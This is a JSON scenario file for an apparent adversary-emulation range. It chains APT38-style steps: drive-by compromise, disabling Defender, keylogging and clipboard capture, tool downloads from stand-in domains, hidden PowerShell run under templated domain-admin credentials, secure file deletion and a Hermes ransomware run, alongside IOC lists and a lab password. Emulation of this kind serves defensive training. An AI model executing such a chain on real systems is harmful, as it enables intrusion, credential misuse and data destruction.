@@ -1,0 +1,680 @@
+{
+    "meta_data": {
+        "name": "apt38",
+        "version": "v1.0.0",
+        "title": "APT38 Inspired Scenario",
+        "description": "This scenario is inspired by APT38, a North Korean state sponsored threat group",
+        "author": "Attack Content",
+        "suggested_duration": 1110
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "self.tool_name2",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX3",
+            "preconditions": {
+                "payload": "self.tool_name3",
+                "driveby": "self.driveby3",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces4",
+            "preconditions": {
+                "driveby": "self.driveby4"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS4",
+            "preconditions": {
+                "driveby": "self.driveby4"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX4",
+            "preconditions": {
+                "payload": "self.tool_name4",
+                "driveby": "self.driveby4",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "DisableOrModifyTools",
+            "technique": "DefenseEvasion",
+            "label": "Disable_Defender_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ClipboardData",
+            "technique": "Collection",
+            "label": "Get-clipboard-data_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "Keylogging",
+            "technique": "Collection",
+            "label": "Get-keyboard-data_t1_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "keylog_timer": 300000
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "Get-kit_t1_4",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_store_server": "self.driveby_domain2",
+                    "file_name": "self.tool_name2",
+                    "output_directory": "C:\\Users\\Public",
+                    "output_file_name": "nkkit.zip"
+                }
+            }
+        },
+        {
+            "tactic": "ProcessDiscovery",
+            "technique": "Discovery",
+            "label": "ProcessDiscovery_t1_5",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\Sysmon64.exe -i C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml;}'};echo 'Installed Sysmon';}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletionPowershell",
+            "technique": "DefenseEvasion",
+            "label": "FileDeletion_t1_6",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\sdelete64.exe -p5 C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml}'}; echo 'Removed Sysmon config'}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "NetworkShareDiscovery",
+            "technique": "Discovery",
+            "label": "Network-share_t1_7",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net share"
+                }
+            }
+        },
+        {
+            "tactic": "NativeApi",
+            "technique": "Execution",
+            "label": "Windows-native-api_t1_8",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "Get-dll-file_t1_9",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_store_server": "self.driveby_domain3",
+                    "file_name": "self.tool_name3",
+                    "output_directory": "C:\\Users\\Public",
+                    "output_file_name": "popup.dll"
+                }
+            }
+        },
+        {
+            "tactic": "Rundll32",
+            "technique": "DefenseEvasion",
+            "label": "Run-dll-file_t1_10",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_name": "C:\\Users\\Public\\popup.dll",
+                    "entry_point": "Main"
+                }
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "fileAndDirectoryDiscovery_t1_11",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Desktop| Sort-Object -property lastwritetime; echo 'User Desktop Directory Listing Complete';}"
+                }
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "fileAndDirectoryDiscovery_t1_12",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Downloads| Sort-Object -property lastwritetime; echo 'User Downloads Directory Listing Complete';}"
+                }
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "fileAndDirectoryDiscovery_t1_13",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Documents| Sort-Object -property lastwritetime; echo 'User Documents Directory Listing Complete';}"
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "Get-Ransomware-kit_t1_14",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_store_server": "self.driveby_domain4",
+                    "file_name": "self.tool_name4",
+                    "output_directory": "C:\\Users\\Public",
+                    "output_file_name": "TaskMon.zip"
+                }
+            }
+        },
+        {
+            "tactic": "DeobfuscateDecodeFilesOrInformation",
+            "technique": "DefenseEvasion",
+            "label": "Uncompress-Hermes-Kit_t1_15",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Expand-Archive C:\\Users\\Public\\TaskMon.zip -DestinationPath C:\\Users\\Public\\TaskMon; echo 'Unzip Complete'}"
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletionPowershell",
+            "technique": "DefenseEvasion",
+            "label": "FileDeletion_t1_16",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Remove-Item C:\\Users\\Public\\TaskMon.zip; echo 'Removed ZIP Tools'}"
+                }
+            }
+        },
+        {
+            "tactic": "DataEncryptedForImpact",
+            "technique": "Impact",
+            "label": "Execute_Hermes_Ransomware_t1_17",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "staradvertsment.com",
+            "hunting.bannerexposure.info",
+            "staradvertisment.com",
+            "accompanied.bannerexposure.info",
+            "switzerland.innovativebanner.info",
+            "name.secondadvertisements.com",
+            "assessed.secondadvertisements.com",
+            "marketing.roadadvertisements.com",
+            "bannerssale.com",
+            "bannerssales.com",
+            "aquaadvertisements.com",
+            "technologies.roadadvertisements.com",
+            "ukraine.innovativebanner.info",
+            "briancobert.com",
+            "rainbowrealty.com"
+        ],
+        "ip": [
+            "159.65.121.94/24",
+            "159.64.10.5/24",
+            "159.64.16.89/24",
+            "159.64.23.24/24",
+            "159.64.43.159/24",
+            "159.64.83.211/24",
+            "159.64.96.121/24",
+            "159.64.114.63/24",
+            "159.64.197.83/24",
+            "205.185.121.209/24",
+            "207.148.104.5/24",
+            "207.148.23.4/24",
+            "207.148.55.180/24",
+            "207.148.67.200/24",
+            "207.148.65.143/24"
+        ],
+        "binary": [
+            "invoice_aug.exe",
+            "azo.exe",
+            "qwerty2.exe",
+            "hrms1.exe",
+            "hrms2.exe",
+            "hrms3.exe",
+            "hrms4.exe",
+            "hmrs5.exe",
+            "invoice_sept.exe",
+            "invoice_oct.exe",
+            "azo1.exe",
+            "azo2.exe",
+            "azo3.exe",
+            "azo4.exe",
+            "azo5.exe"
+        ]
+    },
+    "spec": {
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "90",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "apt_38_v1-kit.zip"
+            },
+            "3": {
+                "name": "MessageBoxPopup_DllPopUp_PopUp_Main.dll"
+            },
+            "4": {
+                "name": "hermes_ransomware.zip"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "157.32.19.24/24",
+                "ioc-domain_driveby": "arkansaspumps.us"
+            },
+            "3": {
+                "ioc-ip_driveby": "41.312.107.54/24",
+                "ioc-domain_driveby": "oregonpumps.us"
+            },
+            "4": {
+                "ioc-ip_driveby": "211.162.38.190/24",
+                "ioc-domain_driveby": "californiapumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!",
+                "payload_destination": "C:\\Users\\Public"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "tool_name3": {
+                "path": [
+                    "tool",
+                    "3",
+                    "name"
+                ]
+            },
+            "tool_name4": {
+                "path": [
+                    "tool",
+                    "4",
+                    "name"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby3": {
+                "path": [
+                    "driveby",
+                    "3"
+                ]
+            },
+            "driveby_domain3": {
+                "path": [
+                    "driveby",
+                    "3",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby4": {
+                "path": [
+                    "driveby",
+                    "4"
+                ]
+            },
+            "driveby_domain4": {
+                "path": [
+                    "driveby",
+                    "4",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "domain_admin_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_username"
+                ]
+            },
+            "domain_admin_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_password"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
